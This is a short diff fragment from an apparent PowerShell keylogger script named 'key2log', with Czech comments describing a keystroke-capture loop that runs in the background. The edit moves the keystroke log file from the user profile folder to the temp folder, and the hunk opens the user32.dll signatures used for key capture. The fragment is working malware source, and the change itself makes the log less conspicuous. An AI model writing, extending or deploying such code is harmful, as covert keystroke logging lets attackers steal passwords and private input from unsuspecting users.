@@ -316,7 +316,7 @@ function key2log {
     # Definuj hlavní smyčku keyloggeru, která poběží na pozadí
     $scriptBlock = {
         param ($DurationInSeconds)     
-        $path = "$env:userprofile\key2log.txt"
+        $path = "$env:tmp\key2log.txt"
         if ((Test-Path $path) -eq $false) { New-Item $path }
         $signatures = @'
         [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
